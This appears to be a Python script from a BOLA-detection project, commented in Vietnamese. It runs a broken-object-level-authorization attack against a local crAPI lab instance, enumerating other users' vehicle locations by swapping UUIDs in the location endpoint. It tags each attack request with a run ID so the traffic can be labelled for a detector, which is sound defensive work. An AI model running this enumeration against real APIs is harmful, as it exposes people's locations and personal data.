# services/bola-detector/attacks/bola_vehicle_scan.py
"""Attack run: đăng nhập bằng 1 tài khoản, quét vehicle location (lat/long + tên +
email chủ xe) của nhiều tài khoản khác bằng cách đổi vehicle uuid trong path.
Đúng Challenge 1 của crAPI (BOLA) — endpoint thật đã xác nhận qua source code
identity service (VehicleController.getLocationBOLA):
    GET /identity/api/v2/vehicle/{uuid}/location
KHÔNG dùng path /workshop/api/vehicle/{vid} như bản nháp ban đầu — path đó không
tồn tại thật trong hệ thống, chỉ là suy đoán trước khi đối chiếu source code.
"""
import json
import time
import uuid

import requests

BASE = "http://localhost:8888"


def login(email: str, password: str) -> str:
    r = requests.post(
        f"{BASE}/identity/api/auth/login",
        json={"email": email, "password": password},
    )
    r.raise_for_status()
    return r.json()["token"]


def run_attack(
    attacker_token: str,
    victim_vehicle_ids: list[str],
    out_meta_path: str,
    delay_seconds: float = 1.0,
) -> str:
    """Quét lần lượt vehicle_id của nhiều nạn nhân, cách đều nhau `delay_seconds`
    (dấu hiệu script tự động — khác hành vi người dùng thật). Luôn gắn
    X-Attack-Run-Id vào header của mọi request tấn công để SV1 log riêng field
    này ra Envoy, dùng để đối chiếu chính xác request nào thuộc attack run nào
    khi gán nhãn ở Bước 3 (khỏi phải đối chiếu theo IP/thời gian)."""
    attack_run_id = str(uuid.uuid4())
    headers = {
        "Authorization": f"Bearer {attacker_token}",
        "X-Attack-Run-Id": attack_run_id,
    }
    start = time.time()
    leaked = []
    for vid in victim_vehicle_ids:
        resp = requests.get(
            f"{BASE}/identity/api/v2/vehicle/{vid}/location", headers=headers
        )
        leaked.append({"vehicle_id": vid, "status": resp.status_code, "body": resp.json() if resp.ok else None})
        time.sleep(delay_seconds)
    end = time.time()

    with open(out_meta_path, "a") as f:
        f.write(
            json.dumps(
                {
                    "attack_run_id": attack_run_id,
                    "attack_class": "BOLA",
                    "start_ts": start,
                    "end_ts": end,
                    "is_test_only_variant": False,
                }
            )
            + "\n"
        )
    return attack_run_id, leaked


if __name__ == "__main__":
    import sys

    attacker_token = login("attacker@test.local", "Attacker123@")
    victim_vehicle_ids = [line.strip() for line in sys.stdin if line.strip()]
    if not victim_vehicle_ids:
        print("Truyền danh sách vehicle uuid nạn nhân qua stdin, ví dụ:")
        print("  cat victim_vehicle_ids.txt | python3 attacks/bola_vehicle_scan.py")
        sys.exit(1)

    attack_run_id, leaked = run_attack(
        attacker_token, victim_vehicle_ids, "attacks/attack_runs_meta.jsonl"
    )
    print(f"attack_run_id={attack_run_id}")
    for item in leaked:
        print(item)
